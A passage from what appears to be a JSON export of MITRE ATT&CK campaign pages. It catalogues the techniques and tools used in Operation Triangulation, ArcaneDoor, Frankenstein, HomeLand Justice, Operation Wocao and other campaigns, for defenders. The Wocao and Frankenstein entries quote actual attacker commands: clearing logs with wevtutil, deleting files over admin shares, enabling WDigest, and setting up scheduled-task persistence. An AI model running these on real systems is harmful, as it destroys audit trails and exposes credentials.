infiltration channels.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware During Night Dragon, threat actors uploaded commonly available hacker tools to compromised web servers.[1] Enterprise T1033 System Owner/User Discovery During Night Dragon, threat actors used password cracking and pass-the-hash tools to discover usernames and passwords.[1] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash During Night Dragon, threat actors used pass-the-hash tools to obtain authenticated access to sensitive internal desktops and servers.[1] Enterprise T1204 .001 User Execution: Malicious Link During Night Dragon, threat actors enticed users to click on links in spearphishing emails to download malware.[1] Enterprise T1078 Valid Accounts During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[1] .002 Domain Accounts During Night Dragon, threat actors used domain accounts to gain further access to victim systems.[1] Software ID Name Description S0073 ASPXSpy During Night Dragon, threat actors deployed ASPXSpy on compromised web servers.[1] S0110 at During Night Dragon, threat actors used at to execute droppers.[1] S0008 gsecdump During Night Dragon, threat actors used gsecdump to dump account hashes.[1] S0029 PsExec During Night Dragon, threat actors used PsExec to remotely execute droppers.[1] S0350 zwShell During Night Dragon, threat actors used zwShell to generate Trojan variants, control victim machines, and exfiltrate data.[1] References McAfee\u00ae Foundstone\u00ae Professional Services and McAfee Labs\u2122. (2011, February 10). Global Energy Cyberattacks: \u201cNight Dragon\u201d. Retrieved February 19, 2018. "
},
{
"id": 420,
"title": "Operation Triangulation, Campaign C0054",
"path": "/campaigns/C0054/index.html",
"content": " Operation Triangulation Operation Triangulation is a mobile campaign targeting iOS devices.[1] The unidentified actors used zero-click exploits in iMessage attachments to gain Initial Access, then executed exploits and validators, such as Binary Validator before finally executing the TriangleDB implant. ID: C0054 First Seen: January 2019 [1] Last Seen: June 2023 [1] Version: 1.0 Created: 28 March 2025 Last Modified: 28 March 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Mobile T1437 Application Layer Protocol During Operation Triangulation, the threat actors used HTTPS POST requests for C2 communication.[2] Mobile T1429 Audio Capture During Operation Triangulation, the threat actors used a microphone-recording module.[3] Mobile T1634 .001 Credentials from Password Store: Keychain During Operation Triangulation, the threat actors have dumped the device\u2019s keychain.[2][3] Mobile T1533 Data from Local System During Operation Triangulation, the threat actors stole data from SQLite databases.[3] Mobile T1521 .001 Encrypted Channel: Symmetric Cryptography During Operation Triangulation, the threat actors used 3DES and AES to encrypt C2 communication and data.[2][3] .002 Encrypted Channel: Asymmetric Cryptography During Operation Triangulation, the threat actors used RSA to encrypt C2 communication.[2] Mobile T1658 Exploitation for Client Execution During Operation Triangulation, the threat actors sent iMessage messages with malicious exploits that executed without user interaction.[1][3][4] Additionally, the threat actors have used various exploits, such as CVE-2023-41990, CVE-2023-32435, CVE-2023-32434 and CVE-2023-38606, to obtain privilege escalation.[4] Mobile T1404 Exploitation for Privilege Escalation During Operation Triangulation, the threat actors exploited a kernel vulnerability to obtain root privileges.[2] Mobile T1420 File and Directory Discovery During Operation Triangulation, the threat actors have obtained a list of files in a specified directory using the fts API.[2] Mobile T1630 Indicator Removal on Host During Operation Triangulation, the threat actors deleted the initial exploitation message and exploit attachment.[1] .002 File Deletion During Operation Triangulation, the threat actors removed files from the device.[2] Mobile T1544 Ingress Tool Transfer During Operation Triangulation, the threat actors downloaded subsequent stages from the C2.[1][2] Mobile T1430 Location Tracking During Operation Triangulation, the threat actors monitored the device\u2019s geolocation.[2][3] Mobile T1575 Native API During Operation Triangulation, the threat actors use the Audio Queue API to record audio.[3][4] Mobile T1424 Process Discovery During Operation Triangulation, the threat actors have obtained a list of processes.[2] Mobile T1636 .004 Protected User Data: SMS Messages During Operation Triangulation, the threat actors have collected and exfiltrated SMS messages.[3] Mobile T1418 Software Discovery During Operation Triangulation, the threat actors have obtained a list of installed applications.[2] Mobile T1409 Stored Application Data During Operation Triangulation, the threat actors have collected and exfiltrated data from WhatsApp and Telegram.[3] Mobile T1426 System Information Discovery During Operation Triangulation, the threat actors collected device and user information.[1] Mobile T1422 System Network Configuration Discovery During Operation Triangulation, the threat actors use the heartbeat beacons from the implant to obtain device information, such as the IMEI, MEID, and the serial number.[2] Software ID Name Description S1215 Binary Validator [3] S1216 TriangleDB [2] References Kuznetsov, I., et al. (2023, June 1). Operation Triangulation: iOS devices targeted with previously unknown malware. Retrieved April 18, 2024. Kucherin, G., et al. (2023, June 21). Dissecting TriangleDB, a Triangulation spyware implant. Retrieved April 18, 2024. Kucherin, G., et al. (2023, October 23). The outstanding stealth of Operation Triangulation. Retrieved April 18, 2024. Larin, B. (2023, December 27). Operation Triangulation: The last (hardware) mystery. Retrieved April 18, 2024. "
},
{
"id": 421,
"title": "Water Curupira Pikabot Distribution, Campaign C0037",
"path": "/campaigns/C0037/index.html",
"content": " Water Curupira Pikabot Distribution Pikabot was distributed in Water Curupira Pikabot Distribution throughout 2023 by an entity linked to BlackBasta ransomware deployment via email attachments. This activity followed the take-down of QakBot, with several technical overlaps and similarities with QakBot, indicating a possible connection. The identified activity led to the deployment of tools such as Cobalt Strike, while coinciding with campaigns delivering DarkGate and IcedID en route to ransomware deployment.[1] ID: C0037 First Seen: January 2023 [1] Last Seen: December 2023 [1] Contributors: Inna Danilevich, U.S. Bank Version: 1.0 Created: 17 July 2024 Last Modified: 28 October 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Water Curupira Pikabot Distribution installation via JavaScript will launch follow-on commands via cmd.exe.[1] .007 Command and Scripting Interpreter: JavaScript Water Curupira Pikabot Distribution initial delivery included obfuscated JavaScript objects stored in password-protected ZIP archives.[1] Enterprise T1140 Deobfuscate/Decode Files or Information Water Curupira Pikabot Distribution used highly obfuscated JavaScript files as one initial installer for Pikabot.[1] Enterprise T1589 .002 Gather Victim Identity Information: Email Addresses Water Curupira Pikabot Distribution utilizes thread spoofing of existing email threads in order to execute spear phishing operations.[1] Enterprise T1105 Ingress Tool Transfer Water Curupira Pikabot Distribution used Curl.exe to download the Pikabot payload from an external server, saving the file to the victim machine's temporary directory.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Water Curupira Pikabot Distribution attached password-protected ZIP archives to deliver Pikabot installers.[1] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 Water Curupira Pikabot Distribution utilizes rundll32.exe to execute the final Pikabot payload, using the named exports Crash or Limit depending on the variant.[1] Enterprise T1204 User Execution Water Curupira Pikabot Distribution requires users to interact with malicious attachments in order to start Pikabot installation.[1] .001 Malicious Link Water Curupira Pikabot Distribution distributed a PDF attachment containing a malicious link to a Pikabot installer.[1] .002 Malicious File Water Curupira Pikabot Distribution delivered Pikabot installers as password-protected ZIP files containing heavily obfuscated JavaScript, or IMG files containing an LNK mimicking a Word document and a malicious DLL.[1] Software ID Name Description S1111 DarkGate Water Curupira Pikabot Distribution activity included distribution of DarkGate en route to ransomware execution.[1] S0483 IcedID Water Curupira Pikabot Distribution included distribution of IcedID en route to ransomware deployment.[1] S1145 Pikabot Water Curupira Pikabot Distribution distributed Pikabot as an initial access mechanism.[1] References Shinji Robert Arasawa, Joshua Aquino, Charles Steven Derion, Juhn Emmanuel Atanque, Francisrey Joshua Castillo, John Carlo Marquez, Henry Salcedo, John Rainier Navato, Arianne Dela Cruz, Raymart Yambot & Ian Kenefick. (2024, January 9). Black Basta-Affiliated Water Curupira\u2019s Pikabot Spam Campaign. Retrieved July 17, 2024. "
},
{
"id": 422,
"title": "ArcaneDoor, Campaign C0046",
"path": "/campaigns/C0046/index.html",
"content": " ArcaneDoor ArcaneDoor is a campaign targeting networking devices from Cisco and other vendors between July 2023 and April 2024, primarily focused on government and critical infrastructure networks. ArcaneDoor is associated with the deployment of the custom backdoors Line Runner and Line Dancer. ArcaneDoor is attributed to a group referred to as UAT4356 or STORM-1849, and is assessed to be a state-sponsored campaign.[1][2] ID: C0046 First Seen: July 2023 [1] Last Seen: April 2024 [1] Contributors: Jun Hirata, NEC Corporation; Sareena Karapoola, NEC Corporation India; Pooja Natarajan, NEC Corporation India Version: 1.0 Created: 06 January 2025 Last Modified: 10 March 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server ArcaneDoor included the use of dedicated, adversary-controlled virtual private servers for command and control.[1] .006 Acquire Infrastructure: Web Services ArcaneDoor included the use of OpenConnect VPN Server instances for conducting actions on victim devices.[1] Enterprise T1557 Adversary-in-the-Middle ArcaneDoor included interception of HTTP traffic to victim devices to identify and parse command and control information sent to the device.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols ArcaneDoor command and control activity was conducted through HTTP.[1] Enterprise T1119 Automated Collection ArcaneDoor included collection of packet capture and system configuration information.[2] Enterprise T1020 Automated Exfiltration ArcaneDoor included scripted exfiltration of collected data.[2] Enterprise T1037 Boot or Logon Initialization Scripts ArcaneDoor used malicious boot scripts to install the Line Runner backdoor on victim devices.[1] Enterprise T1059 Command and Scripting Interpreter ArcaneDoor included the adversary executing command line interface (CLI) commands.[1] Enterprise T1140 Deobfuscate/Decode Files or Information ArcaneDoor involved the use of Base64 obfuscated scripts and commands.[1] Enterprise T1587 .001 Develop Capabilities: Malware ArcaneDoor featured the development and deployment of two unique malware types, Line Dancer and Line Runner.[2][1] .003 Develop Capabilities: Digital Certificates ArcaneDoor included acquiring digital certificates mimicking patterns associated with Cisco ASA appliances for command and control infrastructure.[1] Enterprise T1041 Exfiltration Over C2 Channel ArcaneDoor included use of existing command and control channels for data exfiltration.[1][2] Enterprise T1190 Exploit Public-Facing Application ArcaneDoor abused WebVPN traffic to targeted devices to achieve unauthorized remote code execution.[2] Enterprise T1133 External Remote Services ArcaneDoor used WebVPN sessions commonly associated with Clientless SSLVPN services to communicate to compromised devices.[2] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools ArcaneDoor modified the Authentication, Authorization, and Accounting (AAA) function of targeted Cisco ASA appliances to allow the threat actor to bypass normal AAA operations.[1][2] .003 Impair Defenses: Impair Command History Logging ArcaneDoor included disabling logging on targeted Cisco ASA appliances.[1][2] Enterprise T1070 .004 Indicator Removal: File Deletion ArcaneDoor included multiple instances of file deletion or removal during execution and other adversary actions.[1][2] Enterprise T1036 Masquerading ArcaneDoor involved the use of digital certificates on adversary-controlled network infrastructure that mimicked the formatting used by legitimate Cisco ASA appliances.[1] Enterprise T1556 Modify Authentication Process ArcaneDoor included modification of the AAA process to bypass authentication mechanisms.[1] Enterprise T1040 Network Sniffing ArcaneDoor included network packet capture and sniffing for data collection in victim environments.[1][2] Enterprise T1653 Power Settings ArcaneDoor involved exploitation of CVE-2024-20353 to force a victim Cisco ASA to reboot, triggering the automated unzipping and execution of the Line Runner implant.[1] Enterprise T1055 Process Injection ArcaneDoor included injecting code into the AAA and Crash Dump processes on infected Cisco ASA devices.[1] Enterprise T1014 Rootkit ArcaneDoor included hooking the processHostScanReply() function on victim Cisco ASA devices.[1] Enterprise T1082 System Information Discovery ArcaneDoor included collection of victim device configuration information.[2] Enterprise T1102 .003 Web Service: One-Way Communication ArcaneDoor utilized HTTP command and control traffic where commands are intercepted from HTTP traffic to the device, parsed for appropriate identifiers and commands, and then executed.[1] Software ID Name Description S1186 Line Dancer Line Dancer is uniquely associated with the ArcaneDoor campaign.[2][1] S1188 Line Runner Line Runner was used during the ArcaneDoor campaign.[2][1] References Cisco Talos. (2024, April 24). ArcaneDoor - New espionage-focused campaign found targeting perimeter network devices. Retrieved January 6, 2025. Canadian Centre for Cyber Security. (2024, April 24). Cyber Activity Impacting CISCO ASA VPNs. Retrieved January 6, 2025. "
},
{
"id": 423,
"title": "Frankenstein, Campaign C0001",
"path": "/campaigns/C0001/index.html",
"content": " Frankenstein Frankenstein was described by security researchers as a highly-targeted campaign conducted by moderately sophisticated and highly resourceful threat actors in early 2019. The unidentified actors primarily relied on open source tools, including Empire. The campaign name refers to the actors' ability to piece together several unrelated open-source tool components.[1] ID: C0001 First Seen: January 2019 [1] Last Seen: April 2019 [1] Version: 1.1 Created: 07 September 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Frankenstein, the threat actors used HTTP GET requests for C2.[1] Enterprise T1119 Automated Collection During Frankenstein, the threat actors used Empire to automatically gather the username, domain name, machine name, and other system information.[1] Enterprise T1020 Automated Exfiltration During Frankenstein, the threat actors collected information via Empire, which was automatically sent back to the adversary's C2.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During Frankenstein, the threat actors used PowerShell to run a series of Base64-encoded commands that acted as a stager and enumerated hosts.[1] .003 Command and Scripting Interpreter: Windows Command Shell During Frankenstein, the threat actors ran a command script to set up persistence as a scheduled task named \"WinUpdate\", as well as other encoded commands from the command-line [1] .005 Command and Scripting Interpreter: Visual Basic During Frankenstein, the threat actors used Word documents that prompted the victim to enable macros and run a Visual Basic script.[1] Enterprise T1005 Data from Local System During Frankenstein, the threat actors used Empire to gather various local system information.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During Frankenstein, the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.[1] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography During Frankenstein, the threat actors communicated with C2 via an encrypted RC4 byte stream and AES-CBC.[1] Enterprise T1041 Exfiltration Over C2 Channel During Frankenstein, the threat actors collected information via Empire, which sent the data back to the adversary's C2.[1] Enterprise T1203 Exploitation for Client Execution During Frankenstein, the threat actors exploited CVE-2017-11882 to execute code on the victim's machine.[1] Enterprise T1105 Ingress Tool Transfer During Frankenstein, the threat actors downloaded files and tools onto a victim machine.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service During Frankenstein, the threat actors named a malicious scheduled task \"WinUpdate\" for persistence.[1] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation During Frankenstein, the threat actors ran encoded commands from the command line.[1] Enterprise T1588 .002 Obtain Capabilities: Tool For Frankenstein, the threat actors obtained and used Empire.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment During Frankenstein, the threat actors likely used spearphishing emails to send malicious Microsoft Word documents.[1] Enterprise T1057 Process Discovery During Frankenstein, the threat actors used Empire to obtain a list of all running processes.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During Frankenstein, the threat actors established persistence through a scheduled task using the command: /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR, named \"WinUpdate\" [1] Enterprise T1518 .001 Software Discovery: Security Software Discovery During Frankenstein, the threat actors used WMI queries to determine if analysis tools were running on a compromised system.[1] Enterprise T1082 System Information Discovery During Frankenstein, the threat actors used Empire to obtain the compromised machine's name.[1] Enterprise T1016 System Network Configuration Discovery During Frankenstein, the threat actors used Empire to find the public IP address of a compromised system.[1] Enterprise T1033 System Owner/User Discovery During Frankenstein, the threat actors used Empire to enumerate hosts and gather username, machine name, and administrative permissions information.[1] Enterprise T1221 Template Injection During Frankenstein, the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website.[1] Enterprise T1127 .001 Trusted Developer Utilities Proxy Execution: MSBuild During Frankenstein, the threat actors used MSbuild to execute an actor-created file.[1] Enterprise T1204 .002 User Execution: Malicious File During Frankenstein, the threat actors relied on a victim to enable macros within a malicious Microsoft Word document likely sent via email.[1] Enterprise T1497 .001 Virtualization/Sandbox Evasion: System Checks During Frankenstein, the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution.[1] Enterprise T1047 Windows Management Instrumentation During Frankenstein, the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version.[1] Software ID Name Description S0363 Empire During Frankenstein the threat actors used Empire for discovery.[1] References Adamitis, D. et al. (2019, June 4). It's alive: Threat actors cobble together open-source pieces into monstrous Frankenstein campaign. Retrieved May 11, 2020. "
},
{
"id": 424,
"title": "HomeLand Justice, Campaign C0038",
"path": "/campaigns/C0038/index.html",
"content": " HomeLand Justice HomeLand Justice was a disruptive campaign involving the use of ransomware, wiper malware, and sensitive information leaks conducted by Iranian state cyber actors against Albanian government networks in July and September 2022. Initial access for HomeLand Justice was established in May 2021 as threat actors subsequently moved laterally, exfiltrated sensitive information, and maintained persistence for approximately 14 months prior to the attacks. Responsibility was claimed by the \"HomeLand Justice\" front whose messaging indicated targeting of the Mujahedeen-e Khalq (MEK), an Iranian opposition group who maintain a refugee camp in Albania, and were formerly designated a terrorist organization by the US State Department.[1][2][3] A second wave of attacks was launched in September 2022 using similar tactics after public attribution of the previous activity to Iran and the severing of diplomatic ties between Iran and Albania.[3] ID: C0038 First Seen: May 2021 [1][2][3] Last Seen: September 2022 [3] Contributors: Aung Kyaw Min Naing, @Nolan Version: 1.0 Created: 06 August 2024 Last Modified: 31 October 2024 Version Permalink Live Version Groups ID Name Description G1001 HEXANE HEXANE probed victim infrastructure in support of HomeLand Justice.[2] Techniques Used Domain ID Name Use Enterprise T1134 .001 Access Token Manipulation: Token Impersonation/Theft During HomeLand Justice, threat actors used custom tooling to acquire tokens using ImpersonateLoggedOnUser/SetThreadToken.[2] Enterprise T1087 .003 Account Discovery: Email Account During HomeLand Justice, threat actors used compromised Exchange accounts to search mailboxes for administrator accounts.[3] Enterprise T1098 .002 Account Manipulation: Additional Email Delegate Permissions During HomeLand Justice, threat actors added the ApplicationImpersonation management role to accounts under their control to impersonate users and take ownership of targeted mailboxes.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During HomeLand Justice, threat actors used PowerShell cmdlets New-MailboxSearch and Get-Recipient for discovery.[3][2] .003 Command and Scripting Interpreter: Windows Command Shell During HomeLand Justice, threat actors used Windows batch files for persistence and execution.[3][2] Enterprise T1486 Data Encrypted for Impact During HomeLand Justice, threat actors used ROADSWEEP ransomware to encrypt files on targeted systems.[1][3][2] Enterprise T1561 .002 Disk Wipe: Disk Structure Wipe During HomeLand Justice, threat actors used a version of ZeroCleare to wipe disk drives on targeted hosts.[3][2] Enterprise T1114 .002 Email Collection: Remote Email Collection During HomeLand Justice, threat actors made multiple HTTP POST requests to the Exchange servers of the victim organization to transfer data.[3] Enterprise T1041 Exfiltration Over C2 Channel During HomeLand Justice, threat actors used HTTP to transfer data from compromised Exchange servers.[3] Enterprise T1190 Exploit Public-Facing Application For HomeLand Justice, threat actors exploited CVE-2019-0604 in Microsoft SharePoint for initial access.[3] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools During HomeLand Justice, threat actors modified and disabled components of endpoint detection and response (EDR) solutions including Microsoft Defender Antivirus.[2] .002 Impair Defenses: Disable Windows Event Logging During HomeLand Justice, threat actors deleted Windows events and application logs.[2] Enterprise T1105 Ingress Tool Transfer During HomeLand Justice, threat actors used web shells to download files to compromised infrastructure.[2] Enterprise T1570 Lateral Tool Transfer During HomeLand Justice, threat actors initiated a process named Mellona.exe to spread the ROADSWEEP file encryptor and a persistence script to a list of internal machines.[3] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location During HomeLand Justice, threat actors renamed ROADSWEEP to GoXML.exe and ZeroCleare to cl.exe.[3][1] Enterprise T1046 Network Service Discovery During HomeLand Justice, threat actors executed the Advanced Port Scanner tool on compromised systems.[3][2] Enterprise T1588 .002 Obtain Capabilities: Tool During HomeLand Justice, threat actors used tools including Advanced Port Scanner, Mimikatz, and Impacket.[3][2] .003 Obtain Capabilities: Code Signing Certificates During HomeLand Justice, threat actors used tools with legitimate code signing certificates. [3] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory During HomeLand Justice, threat actors dumped LSASS memory on compromised hosts.[3] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During HomeLand Justice, threat actors primarily used RDP for lateral movement in the victim environment.[3][2] .002 Remote Services: SMB/Windows Admin Shares During HomeLand Justice, threat actors used SMB for lateral movement.[3][2] Enterprise T1505 .003 Server Software Component: Web Shell For HomeLand Justice, threat actors used .aspx webshells named pickers.aspx, error4.aspx, and ClientBin.aspx, to maintain persistence.[3][2] Enterprise T1078 Valid Accounts During HomeLand Justice, threat actors used a compromised Exchange account to search mailboxes and create new Exchange accounts.[3] .001 Default Accounts During HomeLand Justice, threat actors used the built-in administrator account to move laterally using RDP and Impacket.[2] Enterprise T1047 Windows Management Instrumentation During HomeLand Justice, threat actors used WMI to modify Windows Defender settings.[2] Software ID Name Description S1149 CHIMNEYSWEEP [1] S0095 ftp [3] S0357 Impacket [2] S0002 Mimikatz [3][2] S0364 RawDisk [3][2] S1150 ROADSWEEP [1] S1151 ZeroCleare [3][2] References Jenkins, L. at al. (2022, August 4). ROADSWEEP Ransomware - Likely Iranian Threat Actor Conducts Politically Motivated Disruptive Activity Against Albanian Government Organizations. Retrieved August 6, 2024. MSTIC. (2022, September 8). Microsoft investigates Iranian attacks against the Albanian government. Retrieved August 6, 2024. CISA. (2022, September 23). AA22-264A Iranian State Actors Conduct Cyber Operations Against the Government of Albania. Retrieved August 6, 2024. "
},
{
"id": 425,
"title": "C0010, Campaign C0010",
"path": "/campaigns/C0010/index.html",
"content": " C0010 C0010 was a cyber espionage campaign conducted by UNC3890 that targeted Israeli shipping, government, aviation, energy, and healthcare organizations. Security researcher assess UNC3890 conducts operations in support of Iranian interests, and noted several limited technical connections to Iran, including PDB strings and Farsi language artifacts. C0010 began by at least late 2020, and was still ongoing as of mid-2022.[1] ID: C0010 First Seen: December 2020 [1] Last Seen: August 2022 [1] Version: 1.0 Created: 21 September 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For C0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.[1] Enterprise T1584 .001 Compromise Infrastructure: Domains During C0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.[1] Enterprise T1587 .001 Develop Capabilities: Malware For C0010, UNC3890 actors used unique malware, including SUGARUSH and SUGARDUMP.[1] Enterprise T1189 Drive-by Compromise During C0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.[1] Enterprise T1105 Ingress Tool Transfer During C0010, UNC3890 actors downloaded tools and malware onto a compromised host.[1] Enterprise T1588 .002 Obtain Capabilities: Tool For C0010, UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware For C0010, UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system.[1] .002 Stage Capabilities: Upload Tool For C0010, UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.[1] .004 Stage Capabilities: Drive-by Target For C0010, the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.[1] Software ID Name Description S1042 SUGARDUMP [1] S1049 SUGARUSH [1] References Mandiant Israel Research Team. (2022, August 17). Suspected Iranian Actor Targeting Israeli Shipping, Healthcare, Government and Energy Sectors. Retrieved September 21, 2022. "
},
{
"id": 426,
"title": "Operation Wocao, Campaign C0014",
"path": "/campaigns/C0014/index.html",
"content": " Operation Wocao Operation Wocao was a cyber espionage campaign that targeted organizations around the world, including in Brazil, China, France, Germany, Italy, Mexico, Portugal, Spain, the United Kingdom, and the United States. The suspected China-based actors compromised government organizations and managed service providers, as well as aviation, construction, energy, finance, health care, insurance, offshore engineering, software development, and transportation companies.[1] Security researchers assessed the Operation Wocao actors used similar TTPs and tools as APT20, suggesting a possible overlap. Operation Wocao was named after an observed command line entry by one of the threat actors, possibly out of frustration from losing webshell access.[1] ID: C0014 First Seen: December 2017 [1] Last Seen: December 2019 [1] Contributors: Erik Schamper, @Schamperr, Fox-IT; Maarten van Dantzig, @MaartenVDantzig, Fox-IT Version: 1.1 Created: 27 September 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account During Operation Wocao, threat actors used the net command to retrieve information about domain accounts.[1] Enterprise T1583 .004 Acquire Infrastructure: Server For Operation Wocao, the threat actors purchased servers with Bitcoin to use during the operation.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Operation Wocao, threat actors\u2019 XServer tool communicated using HTTP and HTTPS.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During Operation Wocao, threat actors archived collected files with WinRAR, prior to exfiltration.[1] Enterprise T1119 Automated Collection During Operation Wocao, threat actors used a script to collect information about the infected system.[1] Enterprise T1115 Clipboard Data During Operation Wocao, threat actors collected clipboard data in plaintext.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During Operation Wocao, threat actors used PowerShell on compromised systems.[1] .003 Command and Scripting Interpreter: Windows Command Shell During Operation Wocao, threat actors spawned a new cmd.exe process to execute commands.[1] .005 Command and Scripting Interpreter: Visual Basic During Operation Wocao, threat actors used VBScript to conduct reconnaissance on targeted systems.[1] .006 Command and Scripting Interpreter: Python During Operation Wocao, threat actors' backdoors were written in Python and compiled with py2exe.[1] Enterprise T1555 .005 Credentials from Password Stores: Password Managers During Operation Wocao, threat actors accessed and collected credentials from password managers.[1] Enterprise T1005 Data from Local System During Operation Wocao, threat actors exfiltrated files and directories of interest from the targeted system.[1] Enterprise T1001 Data Obfuscation During Operation Wocao, threat actors encrypted IP addresses used for \"Agent\" proxy hops with RC4.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During Operation Wocao, threat actors staged archived files in a temporary directory prior to exfiltration.[1] Enterprise T1587 .001 Develop Capabilities: Malware During Operation Wocao, threat actors developed their own custom webshells to upload to compromised servers.[1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography During Operation Wocao, threat actors' proxy implementation \"Agent\" upgraded the socket in use to a TLS socket.[1] Enterprise T1585 .002 Establish Accounts: Email Accounts For Operation Wocao, the threat actors registered email accounts to use during the campaign.[1] Enterprise T1041 Exfiltration Over C2 Channel During Operation Wocao, threat actors used the XServer backdoor to exfiltrate data.[1] Enterprise T1190 Exploit Public-Facing Application During Operation Wocao, threat actors gained initial access by exploiting vulnerabilities in JBoss webservers.[1] Enterprise T1133 External Remote Services During Operation Wocao, threat actors used stolen credentials to connect to the victim's network via VPN.[1] Enterprise T1083 File and Directory Discovery During Operation Wocao, threat actors gathered a recursive directory listing to find files and directories of interest.[1] Enterprise T1589 Gather Victim Identity Information During Operation Wocao, threat actors targeted people based on their organizational roles and privileges.[1] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall During Operation Wocao, threat actors used PowerShell to add and delete rules in the Windows firewall.[1] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs During Operation Wocao, the threat actors deleted all Windows system and security event logs using /Q /c wevtutil cl system and /Q /c wevtutil cl security.[1] .004 Indicator Removal: File Deletion During Operation Wocao, the threat actors consistently removed traces of their activity by first overwriting a file using /c cd /d c:\\windows\\temp\\ & copy \\\\<IP ADDRESS>\\c$\\windows\\system32\\devmgr.dll \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1 /y and then deleting the overwritten file using /c cd /d c:\\windows\\temp\\ & del \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1.[1] Enterprise T1105 Ingress Tool Transfer During Operation Wocao, threat actors downloaded additional files to the infected system.[1] Enterprise T1056 .001 Input Capture: Keylogging During Operation Wocao, threat actors obtained the password for the victim's password manager via a custom keylogger.[1] Enterprise T1570 Lateral Tool Transfer During Operation Wocao, threat actors used SMB to copy files to and from target systems.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location During Operation Wocao, the threat actors renamed some tools and executables to appear as legitimate programs.[1] Enterprise T1112 Modify Registry During Operation Wocao, the threat actors enabled Wdigest by changing the HKLM\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest registry value from 0 (disabled) to 1 (enabled).[1] Enterprise T1111 Multi-Factor Authentication Interception During Operation Wocao, threat actors used a custom collection method to intercept two-factor authentication soft tokens.[1] Enterprise T1106 Native API During Operation Wocao, threat actors used the CreateProcessA and ShellExecute API functions to launch commands after being injected into a selected process.[1] Enterprise T1046 Network Service Discovery During Operation Wocao, threat actors scanned for open ports and used nbtscan to find NETBIOS nameservers.[1] Enterprise T1135 Network Share Discovery During Operation Wocao, threat actors discovered network disks mounted to the system using netstat.[1] Enterprise T1095 Non-Application Layer Protocol During Operation Wocao, threat actors used a custom protocol for command and control.[1] Enterprise T1571 Non-Standard Port During Operation Wocao, the threat actors used uncommon high ports for its backdoor C2, including ports 25667 and 47000.[1] Enterprise T1027 .005 Obfuscated Files or Information: Indicator Removal from Tools During Operation Wocao, threat actors edited variable names within the Impacket suite to avoid automated detection.[1] .010 Obfuscated Files or Information: Command Obfuscation During Operation Wocao, threat actors executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.[1] Enterprise T1588 .002 Obtain Capabilities: Tool For Operation Wocao, the threat actors obtained a variety of open source tools, including JexBoss, KeeThief, and BloodHound.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory During Operation Wocao, threat actors used ProcDump to dump credentials from memory.[1] .006 OS Credential Dumping: DCSync During Operation Wocao, threat actors used Mimikatz's DCSync to dump credentials from the memory of the targeted system.[1] Enterprise T1120 Peripheral Device Discovery During Operation Wocao, threat actors discovered removable disks attached to a system.[1] Enterprise T1069 .001 Permission Groups Discovery: Local Groups During Operation Wocao, threat actors used the command net localgroup administrators to list all administrators part of a local group.[1] Enterprise T1057 Process Discovery During Operation Wocao, the threat actors used tasklist to collect a list of running processes on an infected system.[1] Enterprise T1055 Process Injection During Operation Wocao, threat actors injected code into a selected process, which in turn launches a command as a child process of the original.[1] Enterprise T1090 Proxy During Operation Wocao, threat actors used a custom proxy tool called \"Agent\" which has support for multiple hops.[1] .001 Internal Proxy During Operation Wocao, threat actors proxied traffic 